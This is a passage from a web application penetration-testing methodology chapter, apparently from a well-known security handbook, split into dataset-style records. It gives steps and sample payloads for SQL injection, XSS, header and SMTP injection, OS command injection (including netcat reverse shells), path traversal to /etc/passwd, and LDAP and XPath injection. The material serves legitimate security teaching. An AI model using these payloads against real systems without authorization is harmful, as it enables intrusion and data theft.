attack.\n7.1.8. Launch the attack, and when it has completed, review the results for\nanomalous responses indicating the presence of vulnerabilities. Check\nfor divergences in the HTTP status code, the response length, the\nresponse time, the appearance of your configured expressions, and\nthe appearance of the payload itself. You can click each column head-\ning in the results table to sort the results by the values in that column\n(and shift-click to reverse-sort the results), which enables you to\nquickly identify any anomalies that stand out from the other results.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 702\n702 Chapter 20 ■ A Web Application Hacker’s Methodology\n7.1.9. For each potential vulnerability indicated by the results of your fuzz\ntesting, refer to the following sections of this methodology, which\ndescribe the detailed steps you should take in relation to each cate-\ngory of problem, to verify the existence of a vulnerability and suc-\ncessfully exploit it.\n7.1.10. Once you have configured Burp Intruder to perform a fuzz test of a\nsingle request, you can quickly repeat the same test on other requests\nwithin the application. Simply select each target request within Burp\nProxy, and choose the Send to Intruder option, then immediately\nlaunch the attack within Intruder, using the existing attack configura-\ntion. In this way, you can launch a large number of tests simultane-\nously in separate windows, and manually review the results as each\ntest completes its work.\n7.1.11. If your mapping exercises identified any out-of-band input channels\nwhereby user-controllable input can be introduced into the applica-\ntion’s processing, you should perform a similar fuzzing exercise on\nthese input channels, submitting various crafted data designed to\ntrigger common vulnerabilities when processed within the web\napplication. Depending on the nature of the input channel, you may\nneed to create a custom script or other harness for this purpose.\n7.1.12. In addition to your own fuzzing of application requests, if you have\naccess to an automated web application vulnerability scanner, you\nshould run this against the target application to provide a basis for\ncomparison with your own findings.\n7.2. Test for SQL Injection\n7.2.1. If the SQL attack strings listed in step 7.1.3 result in any anomalous\nresponses, probe the application’s handling of the relevant parameter\nmanually to determine whether a SQL injection vulnerability is\npresent.\n7.2.2. If any database error messages were returned, investigate the mean-\ning of these. Use the “SQL Syntax and Error Reference” section in\nChapter 9 to help interpret error messages on some common data-\nbase platforms.\n7.2.3. If submitting a single quotation mark in the parameter causes an\nerror or other anomalous behavior, submit two single quotation\nmarks together. If this input causes the error or anomalous behavior\nto disappear, then the application is probably vulnerable to SQL\ninjection.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 703\nChapter 20 ■ A Web Application Hacker’s Methodology 703\n7.2.4. Try using common SQL string concatenator functions to construct a\nstring that is equivalent to some benign input. If this causes the same\nresponse as the original benign input, then the application is proba-\nbly vulnerable. For example, if the original input is the expression\nFOO, you can perform this test using the following items:\n'||'FOO\n'+'FOO\n' 'FOO [note the space between the two quotes]\nAs always, be sure to URL-encode characters such as +and space\nthat have special meaning within HTTP requests.\n7.2.5. If the original input is numeric, try using a mathematical expression\nthat is equivalent to the original value. For example, if the original\nvalue was 2, try submitting 1+1 or 3-1. If the application responds in\nthe same way, then it may be vulnerable, particularly if the value of\nthe numeric expression has a systematic effect on the application’s\nbehavior.\n7.2.6. If the preceding test is successful, you can gain further assurance that\nan SQL injection vulnerability is involved, by using SQL-specific\nmathematical expressions to construct a particular value. If the appli-\ncation’s logic can be systematically manipulated in this way, then it is\nalmost certainly vulnerable to SQL injection. For example, both of the\nfollowing items are equivalent to the number 2:\n67-ASCII('A')\n51-ASCII(1)\n7.2.7. If either of the fuzz test cases using the waitforcommand resulted in\nan abnormal time delay before the application responded, then this is\na strong indicator that the database type is MS-SQL and the applica-\ntion is vulnerable to SQL injection. Repeat the test manually, specify-\ning different values in the waitforparameter, and determine\nwhether the time taken to respond varies systematically with this\nvalue. Note that your attack payload may be inserted into more than\none SQL query, so the time delay observed may be a fixed multiple of\nthe value specified.\n7.2.8. If the application is vulnerable to SQL injection, consider what kinds\nof attack are feasible and likely to help you achieve your objectives.\nRefer to Chapter 9 for the detailed steps needed to carry out any of\nthe following attacks:\n■■ Modify the conditions within a WHEREclause to change the appli-\ncation’s logic (for example, injecting or 1=1--to bypass a login).\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 704\n704 Chapter 20 ■ A Web Application Hacker’s Methodology\n■■ Use the UNIONoperator to inject an arbitrary SELECTquery and\ncombine the results with those of the application’s original query.\n■■ Fingerprint the database type using database-specific SQL syntax.\n■■ If the database type is MS-SQL and the application returns ODBC\nerror messages in its responses, leverage these to enumerate the\ndatabase structure and retrieve arbitrary data.\n■■ If you cannot find a means of directly retrieving the results of an\narbitrary injected query, use the following advanced techniques to\nextract data:\n■■ Retrieve string data in numeric form, one byte at a time.\n■■ Use an out-of-band channel.\n■■ If you are able to cause different application responses based\non a single arbitrary condition, use Absinthe to extract arbi-\ntrary data one bit at a time.\n■■ If you are able to trigger time delays based on a single arbitrary\ncondition, exploit these to retrieve data one bit at a time.\n■■ If the application is blocking certain characters or expressions that\nyou require to perform a particular attack, try the various bypass\ntechniques described in Chapter 9 to circumvent the input filter.\n■■ If possible, escalate the attack against the database and the under-\nlying server, by leveraging any vulnerabilities or powerful func-\ntions within the database.\n7.3. Test for XSS and Other Response Injection\n7.3.1. Identify Reflected Request Parameters\n7.3.1.1. Sort the results of your fuzz testing by clicking on the Payload Grep\ncolumn, and identify any matches corresponding to the XSS pay-\nloads listed in step 7.1.3. These are cases where the XSS test strings\nwere returned unmodified within the application’s responses.\n7.3.1.2. For each of these cases, review the application’s response to find the\nlocation of the supplied input. If this appears within the response\nbody, then test for XSS vulnerabilities. If it appears within any HTTP\nheader, then test for header injection vulnerabilities. If it is used in\nthe Locationheader of a 302 response, or used to specify a redirect in\nsome other way, then test for redirection vulnerabilities. Note that\nthe same input might be copied into multiple locations within the\nresponse, and that more than one type of reflected vulnerability\nmight be present.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 705\nChapter 20 ■ A Web Application Hacker’s Methodology 705\n7.3.2. Test for Reflected XSS\n7.3.2.1. For each place within the response body where the value of the\nrequest parameter appears, review the surrounding HTML to iden-\ntify possible ways of crafting your input to cause execution of arbi-\ntrary JavaScript—for example, by injecting <script>tags, injecting\ninto an existing script, or placing a crafted value into a tag attribute.\n7.3.2.2. Use the XSS cheat sheet at http://ha.ckers.org/xss.htmlas a ref-\nerence for the different ways in which crafted input can be used to\ncause execution of JavaScript.\n7.3.2.3. Try submitting various possible exploits to the application, and mon-\nitor its responses to determine whether any filtering or sanitization of\ninput is being performed. If your attack string is returned unmodi-\nfied, use a browser to verify conclusively that you have succeeded in\nexecuting arbitrary JavaScript (for example, by generating an alert\ndialog).\n7.3.2.4. If you find that the application is blocking input containing certain\ncharacters or expressions which you need to use, or is HTML-\nencoding certain characters, try the various filter bypasses\ndescribed in Chapter 12.\n7.3.2.5. If you find an XSS vulnerability in a POSTrequest, this can still be\nexploited via a malicious web site that contains a form with the\nrequired parameters and a script to automatically submit the form.\nNevertheless, a wider range of attack delivery mechanisms is avail-\nable if the exploit can be delivered via a GETrequest. Try submitting\nthe same parameters in a GETrequest and see if the attack still suc-\nceeds. You can use the Change Request Method action in Burp Proxy\nto convert the request for you.\n7.3.3. Test for HTTP Header Injection\n7.3.3.1. For each place within the response headers where the value of the\nrequest parameter appears, verify whether the application accepts\ndata containing URL-encoded carriage-return (%0d) and line-feed\n(%0a) characters, and whether these are returned unsanitized in its\nresponse. (Note that you are looking for the actual newline charac-\nters themselves to appear in the server’s response, not their URL-\nencoded equivalents.)\n7.3.3.2. If a new line appears in the server’s response headers when you sup-\nply crafted input, then the application is vulnerable to HTTP header\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 706\n706 Chapter 20 ■ A Web Application Hacker’s Methodology\ninjection. This can be leveraged to perform various attacks, as\ndescribed in Chapter 12.\n7.3.3.3. If you find that only one of the two newline characters gets returned\nin the server’s responses, it may still be possible to craft a working\nexploit, depending on the context and the browser of the target user.\n7.3.3.4. If you find that the application blocks input containing newline char-\nacters, or sanitizes those characters in its response, try the following\nitems of input to test the effectiveness of the filter:\nfoo%00%0d%0abar\nfoo%250d%250abar\nfoo%%0d0d%%0a0abar\n7.3.4. Test for Arbitrary Redirection\n7.3.4.1. If the reflected input is used to specify the target of a redirect of some\nkind, test whether it is possible to supply crafted input that results in\nan arbitrary redirect to an external web site. If so, this behavior can\nbe exploited to lend credibility to a phishing-style attack.\n7.3.4.2. If the application ordinarily transmits an absolute URL as the para-\nmeter’s value, modify the domain name within the URL and test\nwhether the application redirects you to the different domain.\n7.3.4.3. If the parameter normally contains a relative URL, modify this into\nan absolute URL for a different domain, and test whether the appli-\ncation redirects you to this domain.\n7.3.4.4. If the application carries out some validation on the parameter before\nperforming the redirect, in an effort to prevent external redirection,\nthis is very commonly vulnerable to bypasses. Try the various attacks\ndescribed in Chapter 12 to test the robustness of the filters.\n7.3.5. Test for Stored Attacks\n7.3.5.1. If the application stores items of user-supplied input and later dis-\nplays these on-screen, then after you have fuzzed the entire applica-\ntion you may well observe some of your attack strings being returned\nin responses to requests that did not themselves contain those strings.\nNote any instances where this occurs, and identify the original entry\npoint for the data that is being stored.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 707\nChapter 20 ■ A Web Application Hacker’s Methodology 707\n7.3.5.2. In some cases, user-supplied data will only be successfully stored if\nyou complete a multistage process, which does not occur in basic\nfuzz testing. If your application-mapping exercises identified any\nfunctionality of this kind, manually walk through the relevant\nprocess and test the stored data for XSS vulnerabilities.\n7.3.5.3. If you have sufficient access to test it, review closely any administra-\ntive functionality in which data originating from low-privileged\nusers is ultimately rendered on-screen in the session of more privi-\nleged users. Any stored XSS vulnerabilities in functionality of this\nkind typically leads directly to privilege escalation.\n7.3.5.4. Test every instance where user-supplied data is stored and displayed\nback to users. Probe these for XSS and the other response injection\nattacks described previously.\n7.3.5.5. If you find a vulnerability in which input supplied by one user is dis-\nplayed to other users, determine the most effective attack payload\nwith which you can achieve your objectives, such as session hijack-\ning or request forgery. If the stored data is displayed only back to the\nsame user from whom it originated, then try to find ways of chaining\nany other vulnerabilities you have discovered (such as broken access\ncontrols) to inject an attack into other users’ sessions.\n7.3.5.6. If the application allows upload and download of files, always probe\nthis functionality for stored XSS attacks. If the application allows\nHTML or text files, and does not validate or sanitize their contents,\nthen it is almost certainly vulnerable. If it allows JPEG files and does\nnot validate that they contain valid images, then it is probably vul-\nnerable to attacks against Internet Explorer users. Test the applica-\ntion’s handling of each file type that it supports, and confirm how\nbrowsers handle responses containing HTML instead of the normal\ncontent type.\n7.3.5.7. In every location where data submitted by one user is displayed to\nother users but where the application’s filters prevent you from per-\nforming a stored XSS attack, review whether the application’s behav-\nior leaves it vulnerable to on-site request forgery.\n7.4. Test for OS Command Injection\n7.4.1. If any of the command injection attack strings listed in step 7.1.3\nresulted in an abnormal time delay before the application responded,\nthen this is a strong indicator that the application is vulnerable to OS\ncommand injection. Repeat the test, manually specifying different\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 708\n708 Chapter 20 ■ A Web Application Hacker’s Methodology\nvalues in the -ior -nparameter, and determine whether the time\ntaken to respond varies systematically with this value.\n7.4.2. Using whichever of the injection strings was found to be successful,\ntry injecting a more interesting command (such as lsor dir), and\ndetermine whether you are able to retrieve the results of the com-\nmand back to your browser.\n7.4.3. If you are unable to retrieve results directly, there are other options\nopen to you:\n■■ You can attempt to open an out-of-band channel back to your\ncomputer. Try using TFTP to copy tools up to the server, using\ntelnetor netcatto create a reverse-shell back to your computer,\nand using the mail command to send command output via SMTP.\n■■ You can redirect the results of your commands to a file within the\nweb root, which you can then retrieve directly using your\nbrowser. For example:\ndir > c:\\inetpub\\wwwroot\\foo.txt\n7.4.4. If you find a means of injecting commands and retrieving the results,\nyou should determine your privilege level (by using whoamior a sim-\nilar command, or attempting to write a harmless file to a protected\ndirectory). You may then seek to escalate privileges, gain backdoor\naccess to sensitive application data, or attack other hosts reachable\nfrom the compromised server.\n7.4.5. If you believe that your input is being passed to an OS command of\nsome kind, but the attack strings listed are unsuccessful, see if you\ncan use the <or >character to direct the contents of a file to the com-\nmand’s input or to direct the command’s output to a file. This may\nenable you to read or write arbitrary file contents. If you know or can\nguess the actual command being executed, try injecting command\nline parameters associated with that command, to modify its behav-\nior in useful ways (for example, by specifying an output file within\nthe web root).\n7.4.6. If you find that the application is escaping certain key characters\nwhich you need to perform a command injection attack, try placing\nthe escape character before each such character. If the application\ndoes not escape the escape character itself, then this usually leads to\na bypass of this defensive measure. If you find that whitespace char-\nacters are blocked or sanitized, you may be able to use $IFSin place\nof spaces on Unix-based platforms.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 709\nChapter 20 ■ A Web Application Hacker’s Methodology 709\n7.5. Test for Path Traversal\n7.5.1. For each fuzz test you have performed, review the results generated\nby the path traversal attack strings listed in step 7.1.3. You can click\non the top of the payload column in Burp Intruder to sort the results\ntable by payload, and so group the results for these strings. For any\ncases where an unusual error message was received, or a response\nwith an abnormal length, review the response manually to determine\nwhether it contains the contents of the specified file or other evidence\nthat an anomalous file operation occurred.\n7.5.2. In your mapping of the application’s attack surface, you should have\nnoted any functionality that specifically supports the reading and\nwriting of files on the basis of user-supplied input. In addition to the\ngeneral fuzzing of all parameters, you should manually test this\nfunctionality very carefully to identify any path traversal vulnerabili-\nties that exist.\n7.5.3. Where a parameter appears to contain a filename, a portion of a file-\nname, or a directory, modify the parameter’s existing value to insert\nan arbitrary subdirectory and a single traversal sequence. For exam-\nple, if the application submits the parameter\nfile=foo/file1.txt\nthen try submitting the value\nfile=foo/bar/../file1.txt\nIf the application’s behavior is identical in the two cases, then it may\nbe vulnerable, and you should proceed to the next step. If the behav-\nior is different, then the application may be blocking, stripping, or\nsanitizing traversal sequences, resulting in an invalid file path. Try\nusing the encoding and other attacks described in Chapter 10 in an\nattempt to bypass the filters.\n7.5.4. If the preceding test of using traversal sequences within the base\ndirectory is successful, try using additional sequences to step above\nthe base directory and access known files on the server’s operating\nsystem. If these attempts fail, the application may be imposing vari-\nous filters or checks before file access is granted, and you should\nprobe further to understand the controls that are implemented and\nwhether any bypasses exist.\n7.5.5. The application may be checking the file extension being requested,\nand allowing access only to files of particular kinds. Try using a null\nbyte or newline attack together with a known accepted file extension\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 710\n710 Chapter 20 ■ A Web Application Hacker’s Methodology\nin an attempt to bypass the filter. For example:\n../../../../../boot.ini%00.jpg\n../../../../../etc/passwd%0a.jpg\n7.5.6. The application may be checking that the user-supplied file path\nstarts with a particular directory or stem. Try appending traversal\nsequences after a known accepted stem in an attempt to bypass the\nfilter. For example:\n/images/../../../../../../../etc/passwd\n7.5.7. If these attacks are unsuccessful, try combining multiple bypasses,\nworking initially entirely within the base directory in an attempt to\nunderstand the filters in place and the ways in which the application\nhandles unexpected input.\n7.5.8. If you succeed in gaining read access to arbitrary files on the server,\nattempt to retrieve any of the following files, which may enable you\nto escalate your attack:\n■■ Password files for the operating system and application.\n■■ Server and application configuration files, to discover other vul-\nnerabilities or fine-tune a different attack.\n■■ Include files that may contain database credentials.\n■■ Data sources used by the application, such as MySQL database\nfiles or XML files.\n■■ The source code to server-executable pages, to perform a code\nreview in search of bugs.\n■■ Application log files that may contain information like usernames\nand session tokens.\n7.5.9. If you succeed in gaining write access to arbitrary files on the server,\nexamine whether any of the following attacks are feasible, in order to\nescalate your attack:\n■■ Creating scripts in users’ startup folders.\n■■ Modifying files such as in.ftpdto execute arbitrary commands\nwhen a user next connects.\n■■ Writing scripts to a web directory with execute permissions and\ncalling them from your browser.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 711\nChapter 20 ■ A Web Application Hacker’s Methodology 711\n7.6. Test for Script Injection\n7.6.1. For each fuzz test you have performed, review the results for any\ncontaining the string 111111on its own (that is, not preceded by\nthe rest of the test string). You can quickly identify these in Burp\nIntruder by shift-clicking on the heading for the 111111Grep string,\nto group all the results containing this string, and identifying any\nwhich do not have a check in the Payload Grep column. Any cases\nidentified are likely to be vulnerable to injection of scripting\ncommands.\n7.6.2. Review all the test cases that used script injection strings, and iden-\ntify any containing scripting error messages that may indicate that\nyour input is being executed but caused an error, and so may need to\nbe fine-tuned to perform successful script injection.\n7.6.3. If the application appears to be vulnerable, verify this by injecting\nfurther commands specific to the scripting platform in use. For exam-\nple, you can use attack payloads similar to those used when fuzzing\nfor OS command injection, such as:\nsystem('ping%20127.0.0.1')\n7.7. Test for File Inclusion\n7.7.1. If you received any incoming HTTP connections from the target\napplication’s infrastructure during your fuzzing, then the application\nis almost certainly vulnerable to remote file inclusion. Repeat the rel-\nevant tests in a single-threaded and time-throttled way to determine\nexactly which parameters are causing the application to issue the\nHTTP requests.\n7.7.2. Review the results of the file inclusion test cases, and identify any\nwhich caused an anomalous delay in the application’s response. In\nthese cases, it may be that the application itself is vulnerable but\nthat the resulting HTTP requests are timing out due to network-\nlevel filters.\n7.7.3. If you find a remote file inclusion vulnerability, deploy a web server\ncontaining a malicious script specific to the language you are target-\ning, and use commands like those used to test for script injection to\nverify that your script is being executed."
  },
  {
    "input": "8. Test for Function-Specific Input Vulnerabilities",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 712\n712 Chapter 20 ■ A Web Application Hacker’s Methodology\n8. Test for Function-Specific Input Vulnerabilities\nIn addition to the input-based attacks targeted in the previous step, there is a\nrange of vulnerabilities that normally manifest themselves only in particular\nkinds of functionality. Before proceeding to the individual steps described in\nthis section, you should review your assessment of the application’s attack\nsurface to identify specific application functions where these defects are liable\nto arise, and focus your testing on those.\nApplication mapping results\n8.1. SMTP 8.2. Native 8.3. SOAP 8.4. LDAP 8.5. XPath\ninjection code flaws injection injection injection\nFigure20-9: Testing for functionality-specific input vulnerabilities\n8.1. Test for SMTP Injection\n8.1.1. For each request employed in email-related functionality, submit\neach of the following test strings as each parameter in turn, inserting\nyour own email address at the relevant position. You can use Burp\nIntruder to automate this, as described in step 7.1 for general\nfuzzing. These test strings already have special characters URL-\nencoded, so do not apply any additional encoding to them.\n<youremail>%0aCc:<youremail>\n<youremail>%0d%0aCc:<youremail>\n<youremail>%0aBcc:<youremail>\n<youremail>%0d%0aBcc:<youremail>\n%0aDATA%0afoo%0a%2e%0aMAIL+FROM:+<youremail>%0aRCPT+TO:+<youremail>\n%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+test%0afoo\n%0a%2e%0a\n%0d%0aDATA%0d%0afoo%0d%0a%2e%0d%0aMAIL+FROM:+<youremail>%0d%0aRCPT+\nTO:+<youremail>%0d%0aDATA%0d%0aFrom:+<youremail>%0d%0aTo:+<youremai\nl>%0d%0aSubject:+test%0d%0afoo%0d%0a%2e%0d%0a\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 713\nChapter 20 ■ A Web Application Hacker’s Methodology 713\n8.1.2. Review the results to identify any error messages returned by the\napplication. If these appear to relate to any problem in the email\nfunction, investigate whether you need to fine-tune your input to\nexploit a vulnerability.\n8.1.3. Monitor the email address you specified to see if any email messages\nare received.\n8.1.4. Review closely the HTML form that generates the relevant request.\nThis may contain clues regarding the server-side software being\nused. It may also contain a hidden or disabled field that is used to\nspecify the To address of the email, which you can modify directly.\n8.2. Test for Native Software Vulnerabilities\n8.2.1. Test for Buffer Overflows\n8.2.1.1. For each item of data being targeted, submit a range of long strings\nwith lengths somewhat longer than common buffer sizes. Target one\nitem of data at a time, to maximize the coverage of code paths within\nthe application. You can use the character blocks payload source in\nBurp Intruder to automatically generate payloads of various sizes.\nThe following buffer sizes are suitable to test:\n1100\n4200\n33000\n8.2.1.2. Monitor the application’s responses to identify any anomalies. An\nuncontrolled overflow is almost certain to cause an exception in the\napplication, although diagnosing the nature of the problem remotely\nmay be difficult. Look for any of the following anomalies:\n■■ An HTTP 500 status code or error message, where other mal-\nformed (but not overlong) input does not have the same effect.\n■■ An informative message indicating that a failure occurred in some\nexternal, native code component.\n■■ A partial or malformed response being received from the server.\n■■ The TCP connection to the server closing abruptly without return-\ning a response.\n■■ The entire web application no longer responding.\n■■ Unexpected data being returned by the application, possibly indi-\ncating that a string in memory has lost its null terminator.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 714\n714 Chapter 20 ■ A Web Application Hacker’s Methodology\n8.2.2. Test for Integer Vulnerabilities\n8.2.2.1. When dealing with native code components, identify any integer-\nbased data, particularly length indicators, which may be used to trig-\nger integer vulnerabilities.\n8.2.2.2. Within each targeted item, send suitable payloads designed to\ntrigger any vulnerabilities. For each item of data being targeted, send\na series of different values in turn, representing boundary cases for\nthe signed and unsigned versions of different sizes of integer. For\nexample:\n■■ 0x7f and 0x80 (127 and 128)\n■■ 0xff, and 0x100 (255 and 256)\n■■ 0x7ffff and 0x8000 (32767 and 32768)\n■■ 0xffff and 0x10000 (65535 and 65536)\n■■ 0x7fffffff and 0x80000000 (2147483647 and 2147483648)\n■■ 0xffffffff and 0x0 (4294967295 and 0)\n8.2.2.3. When the data being modified is represented in hexadecimal form,\nsend both little-endian and big-endian versions of each test case—\nfor example, ff7fas well as 7fff. If hexadecimal numbers are sub-\nmitted in ASCII form, use the same case as the application itself uses\nfor alphabetical characters, to ensure these are decoded correctly.\n8.2.2.4. Monitor the application’s responses for anomalous events, as\ndescribed in step 8.2.1.2.\n8.2.3. Test for Format String Vulnerabilities\n8.2.3.1. Targeting each parameter in turn, submit strings containing long\nsequences of different format specifiers. For example:\n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n%n\n%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\n%1!n!%2!n!%3!n!%4!n!%5!n!%6!n!%7!n!%8!n!%9!n!%10!n! etc...\n%1!s!%2!s!%3!s!%4!s!%5!s!%6!s!%7!s!%8!s!%9!s!%10!s! etc...\nRemember to URL-encode the %character as %25.\n8.2.3.2. Monitor the application’s responses for anomalous events, as\ndescribed in step 8.2.1.2.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 715\nChapter 20 ■ A Web Application Hacker’s Methodology 715\n8.3. Test for SOAP Injection\n8.3.1.1. Target each parameter in turn that you suspect is being processed via\na SOAP message. Submit a rogue XML closing tag such as </foo>. If\nno error occurs, your input is probably not being inserted into a\nSOAP message or is being sanitized in some way.\n8.3.1.2. If an error was received, submit instead a valid opening and closing\ntag pair, such as <foo></foo>. If this causes the error to disappear,\nthen the application may well be vulnerable.\n8.3.1.3. If the item you submit is copied back into the application’s\nresponses, submit the following two values in turn. If you find that\neither item is returned as the other, or as simply test, then you can\nbe confident that your input is being inserted into an XML-based\nmessage.\ntest<foo/>\ntest<foo></foo>\n8.3.1.4. If the HTTP request contains several parameters that may be being\nplaced into a SOAP message, try inserting the opening comment\ncharacter <!--into one parameter, and the closing comment charac-\nter !-->into another parameter. Then, switch these around (because\nyou have no way of knowing which order the parameters appear in).\nThis can have the effect of commenting out a portion of the server’s\nSOAP message, which may cause a change in the application’s\nlogic, or result in a different error condition which may divulge\ninformation.\n8.4. Test for LDAP Injection\n8.4.1.1. In any functionality where user-supplied data is used to retrieve\ninformation from a directory service, target each parameter in turn to\ntest for potential injection into an LDAP query.\n8.4.1.2. Submit the *character. If a large number of results are returned, this\nis a good indicator that you are dealing with an LDAP query.\n8.4.1.3. Try entering a number of closing brackets:\n))))))))))\nThis input will invalidate the query syntax, so if an error or other\nanomalous behavior results, then the application may well be vulner-\nable (although many other application functions and injection situa-\ntions may behave in the same way).\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 716\n716 Chapter 20 ■ A Web Application Hacker’s Methodology\n8.4.1.4. Try entering a series of expressions such as the following, until no\nerror occurs, thus establishing the number of brackets you need to\nclose to control the rest of the query. If one of these inputs causes an\nerror to disappear, then the application is almost certainly vulnerable\nto LDAP injection.\n*);cn;\n*));cn;\n*)));cn;\n*))));cn; etc.\n8.4.1.5. Try adding extra attributes to the end of your input, using commas to\nseparate each item. Test each attribute in turn—an error indicates\nthat the attribute is not valid in the present context. The following\nattributes are commonly used in directories queried by LDAP:\ncn\nc\nmail\ngivenname\no\nou\ndc\nl\nuid\nobjectclass\npostaladdress\ndn\nsn\n8.5. Test for XPath Injection\n8.5.1.1. Try submitting the following values, and determine whether these\nresult in different application behavior, without causing an error:\n' or count(parent::*[position()=1])=0 or 'a'='b\n' or count(parent::*[position()=1])>0 or 'a'='b\n8.5.1.2. If the parameter is numeric, also try the following test strings:\n1 or count(parent::*[position()=1])=0\n1 or count(parent::*[position()=1])>0\n8.5.1.3. If any of the preceding strings causes differential behavior within the\napplication without causing an error, it is likely that you can extract\narbitrary data by crafting test conditions to extract one byte of"
  },
  {
    "input": "9. Test for Logic Flaws",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 717\nChapter 20 ■ A Web Application Hacker’s Methodology 717\ninformation at a time. Use a series of conditions with the following\nform to determine the name of the current node’s parent:\nsubstring(name(parent::*[position()=1]),1,1)='a'\n8.5.1.4. Having extracted the name of the parent node, use a series of condi-\ntions with the following form to extract all of the data within the\nXML tree:\nsubstring(//parentnodename[position()=1]/child::node()[position()=\n1]/text(),1,1)='a'\n9. Test for Logic Flaws\n9.1 Identify key attack surface\n9.2. Multi- 9.3. 9.5.\n9.4. Trust\nstage Incomplete Transaction\nboundaries\nprocesses input logic\nFigure20-10: Testing for logic flaws\n9.1. Identify the Key Attack Surface\n9.1.1. Logic flaws can take a huge variety of forms and exist within any\naspect of the application’s functionality. To ensure that probing for\nlogic flaws is a feasible exercise, you should first narrow down the\nattack surface to a reasonable area for manual testing.\n9.1.2. Review the results of your application-mapping exercises, and iden-\ntify any instances of the following features:\n■■ Multistage processes.\n■■ Critical security functions, such as login.\n■■ Transitions across trust boundaries (for example, moving from\nbeing anonymous to being self-registered to being logged in).\n■■ Checks and adjustments made to transaction prices or quantities.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 718\n718 Chapter 20 ■ A Web Application Hacker’s Methodology\n9.2. Test Multistage Processes\n9.2.1. When a multistage process involves a defined sequence of requests,\nattempt to submit these requests out of the expected sequence. Try\nskipping certain stages altogether, accessing a single stage more than\nonce, and accessing earlier stages after later ones.\n9.2.2. The sequence of stages may be accessed via a series of GETor POST\nrequests for distinct URLs, or they may involve submitting different\nsets of parameters to the same URL. The stage being requested may\nbe specified by submitting a function name or index within a request\nparameter. Be sure to understand fully the mechanisms that the\napplication is employing to deliver access to distinct stages.\n9.2.3. In addition to interfering with the sequence of steps, try taking para-\nmeters that are submitted at one stage of the process, and submitting\nthese at a different stage. If the relevant items of data are updated\nwithin the application’s state, you should investigate whether you\ncan leverage this behavior to interfere with the application’s logic.\n9.2.4. If a multistage process involves different users performing opera-\ntions on the same set of data, try taking each parameter submitted\nby one user and submitting it as another. If they are accepted and\nprocessed as that user, explore the implications of this behavior as\ndescribed previously.\n9.2.5. From the context of the functionality that is implemented, try to\nunderstand what assumptions may have been made by developers,\nand where the key attack surface lies. Try to identify ways of violat-\ning those assumptions to cause undesirable behavior within the\napplication.\n9.2.6. When multistage functions are accessed out of sequence, it is com-\nmon to encounter a variety of anomalous conditions within the\napplication, such as variables with null or uninitialized values, par-\ntially defined or inconsistent state, and other unpredictable behavior.\nLook for interesting error messages and debug output, which can be\nused to better understand its internal workings and thereby fine-tune\nthe current or a different attack.\n9.3. Test Handling of Incomplete Input\n9.3.1. For critical security functions within the application, which involve\nprocessing several items of user input and making a decision based\non these, test the application’s resilience to requests containing\nincomplete input.\n70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 719\nChapter 20 ■ A Web Application Hacker’s Methodology 719\n9.3.2. For each parameter in turn, remove both the name and value of the\nparameter from the request. Monitor the application’s responses for\nany divergence in its behavior and any error messages that shed light\non the logic being performed.\n9.3.3. If the request you are manipulating is part of a multistage process,\nfollow the process through to completion, because the application\nmay store data submitted in earlier stages within the session and\nthen process this at a later stage.\n9.4. Test Trust Boundaries\n9.4.1. Probe the way the application handles transitions between different\ntypes of trust of the user. Look for functionality where a user with a\ngiven trust status can accumulate an amount of state relating to their\nidentity—for example, an anonymous user providing personal\ninformation during self-registration, or proceeding through part of\nan account recovery process designed to establish their identity.\n9.4.2. Try to find ways of making improper transitions across trust bound-\naries by accumulating relevant state in one area and then switching\nto a different area in a way that would not normally occur. For exam-\nple, having completed part of an account recovery process, attempt\nto switch to an authenticated user-specific page. Test whether the\napplication assigns you an inappropriate level of trust when you\ntransition in this way.\n9.5. Test Transaction Logic\n9.5.1. In cases where the application imposes transaction limits, test the\neffects of submitting negative values. If these are accepted, it may be\npossible to beat the limits by making large transactions in the oppo-\nsite direction.\n9.5.2. Examine whether you can use a series of successive transactions to\nbring about a state that you can exploit for a useful purpose. For\nexample, you may be able to perform several low value transfers\nbetween accounts to accrue a large balance that the application’s\nlogic was intended to prevent.\n9.5.3. If the application adjusts prices or other sensitive values based on\ncriteria that are determined by user-controllable data or actions, first\nunderstand the algorithms used by the application, and the point\nwithin its logic where adjustments are made. Identify whether these"
  },
  {
    "input": "10. Test for Shared Hosting Vulnerabilities",
    "output": "70779c20.qxd:WileyRed 9/14/07 3:15 PM Page 720\n720 Chapter 20 ■ A Web Application Hacker’s Methodology\nadjustments are made on a one-time basis, or whether they are\nrevised in response to further actions performed by the user.\n9.5.4. Try to find ways of manipulating the application’s behavior to cause\nit to get into a state where the adjustments it has applied do not cor-\nrespond to the original criteria intended by its designers.\n10. Test for Shared Hosting Vulnerabilities\n10.1. Test segregation in shared infrastructures\n10.2. Test segregation between ASP-hosted applications\nFigure20-11: Testing for shared hosting vulnerabilities\n10.1. Test Segregation in Shared Infrastructures\n10.1.1. If the application is hosted in a shared infrastructure, examine the\naccess mechanisms provided for customers of the shared environ-\nment to update and manage their content and functionality. Consider\nthe following questions:\n■■ Does the remote access facility use a secure protocol and suitably\nhardened infrastructure?\n■■ Are customers able to access files, data, and other resources that\nthey do not legitimately need to access?\n■■ Are customers able to gain an interactive shell within the hosting\nenvironment and execute arbitrary commands?\n10.1.2. If a proprietary application is used to allow customers to configure\nand customize a shared environment, consider targeting this applica-\ntion as a means of compromising the environment itself and individ-\nual applications 